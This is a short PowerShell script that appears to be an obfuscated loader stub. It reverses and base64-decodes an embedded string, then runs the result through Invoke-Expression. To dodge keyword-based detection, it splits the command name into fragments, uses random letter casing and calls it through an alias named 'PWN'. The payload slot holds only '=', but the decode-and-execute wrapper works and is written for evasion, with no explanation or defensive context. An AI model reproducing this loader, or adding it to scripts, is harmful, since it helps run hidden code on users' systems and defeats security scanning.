$best64code = "=" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$loadcOdE = [sYSTeM.TEXt.eNCOdInG]::UtF8.GEtsTrIng([SYstem.CONvErT]::FrOMbase64StRing("$BASe64")) ;
$PWn = "iN"+"vO"+"kE"+"-e"+"XP"+"RE"+"sS"+"IO"+"n" ; nEW-ALIas -naMe PWN -VAlUe $PWn -FORCe ; pWn $loaDcoDE ;
